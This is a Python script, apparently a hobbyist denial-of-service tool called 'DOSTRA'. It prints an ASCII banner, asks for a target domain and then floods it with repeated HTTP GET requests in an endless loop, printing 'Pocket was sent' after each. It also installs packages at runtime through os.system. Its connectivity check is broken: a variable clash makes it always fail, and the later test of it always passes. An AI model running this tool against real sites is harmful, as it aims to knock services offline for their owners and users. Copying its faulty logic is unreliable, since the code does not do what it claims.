import os

os.system('pip install termcolor && pip install colored && pip install requests && clear')
import termcolor
from termcolor import colored

def main():
                   
    print(colored("██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░",'blue'))
    print(colored("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗",'blue'))
    print(colored("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║",'blue'))
    print(colored("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║",'blue'))
    print(colored("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║",'blue'))
    print(colored("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝",'blue'))

    print(colored("| made by: KaMrAn ZoNe |\n", 'green'))


main()





import requests
def dos():
        s = input(colored("enter your target\n example: google.com\n\n ~> ",'magenta'))
        #------------------------------
        import socket
        def is_connected():
          try:
            # see if we can resolve the host name -- tells us if there is
            # a DNS listening
            host = socket.gethostbyname(s)
            # connect to the host -- tells us if the host is actually
            # reachable
            s = socket.create_connection((host, 80), 2)
            return True
          except:
             pass
          return False
        print (is_connected())
        #------------------------------
        if is_connected : 
    
            r = requests.get("http://"+s)
    
            print(colored("\nPocket was sent",'red'))
    
            r = requests.get("http://"+s)
    
            print(colored("Pocket was sent",'blue'))
    
            r = requests.get("http://"+s)
    
            print(colored("Pocket was sent",'red'))
    
            r = requests.get("http://"+s)
    
            print(colored("Pocket was sent",'blue'))
    
            c = input(colored("Do you want continue? y/n? ~> ",'yellow'))
    
            if c == 'y':
                while True:
                    r = requests.get("http://"+s)
                    print(colored("Pocket was sent", 'red'))
                    r = requests.get("http://"+s)
                    print(colored("Pocket was sent", 'blue'))
            elif c == 'n':
                os.system('clear')
                main()
                dos()
        else:
            print("Please enter a valid site address")


dos()
